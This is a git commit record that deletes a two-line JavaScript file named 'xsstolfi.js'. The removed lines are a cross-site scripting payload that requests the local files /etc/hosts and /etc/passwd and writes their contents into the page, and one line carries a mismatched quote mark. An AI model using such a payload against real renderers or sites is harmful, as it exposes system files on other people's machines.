676fad58a9339a9c08a12da959d51a8bd660056d
az7rb <54269260+az7rb@users.noreply.github.com>
2021-10-01 01:54:59 +0300

    Delete xsstolfi.js

--- xsstolfi.js
+++
@@ -1,2 +0,0 @@
-x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open('GET','file:///etc/hosts');x.send();
-x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open(‘GET','file:///etc/passwd');x.send();
